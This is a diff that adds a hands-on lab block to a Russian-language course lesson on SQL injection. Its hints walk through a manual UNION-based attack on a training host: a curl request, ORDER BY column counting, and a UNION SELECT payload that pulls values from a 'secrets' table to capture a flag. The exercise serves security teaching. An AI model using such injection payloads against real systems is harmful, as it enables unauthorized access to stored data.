@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как находить, подтверждать и эксплуатировать SQL-инъекции: UNION, boolean/time-blind, sqlmap, обход фильтров."
+lab:
+  kind: shell
+  title: "Практика: ручной UNION-based SQLi"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Норма: `curl -s 'http://vuln.lab.local/product?id=1'` — три поля (id, name, price).
+    - Проверь число колонок: `ORDER BY 3` ок, `ORDER BY 4` — ошибка.
+    - UNION на 3 колонки, вторая — текст: `--data-urlencode 'id=1 UNION SELECT 1,value,3 FROM secrets'`.
+    - Флаг — в поле `name`. Достань: `... | grep 'nto{' | cut -d: -f6 > found.txt`.
 ---
 
 ## Вопрос, с которого всё начинается
